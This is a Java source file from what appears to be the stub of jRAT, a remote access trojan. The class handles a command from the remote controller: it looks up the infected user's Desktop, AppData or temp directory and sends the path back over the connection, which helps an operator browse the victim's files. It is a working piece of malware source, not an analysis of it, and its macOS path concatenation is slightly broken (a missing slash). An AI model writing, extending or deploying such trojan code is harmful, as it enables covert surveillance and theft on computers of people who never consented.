package io.jrat.stub.packets.incoming;

import io.jrat.stub.Connection;
import io.jrat.stub.packets.outgoing.Packet34CustomDirectory;
import oslib.OperatingSystem;

public class Packet41SpecialDirectory extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		String location = con.readLine();

		String ret = null;

		if (location.equals("DESKTOP")) {
			ret = System.getProperty("user.home") + "/Desktop/";
		} else if (location.equals("APPDATA")) {
			if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.WINDOWS) {
				ret = System.getenv("APPDATA");
			} else if (OperatingSystem.getOperatingSystem().getType() == OperatingSystem.OSX) {
				ret = System.getProperty("user.home") + "Library/Application Support/";
			} else {
				ret = System.getProperty("java.io.tmpdir");
			}
		} else if (location.equals("TEMP")) {
			ret = System.getProperty("java.io.tmpdir");
		}

		if (ret != null) {
			con.addToSendQueue(new Packet34CustomDirectory(ret));
		}
	}

}
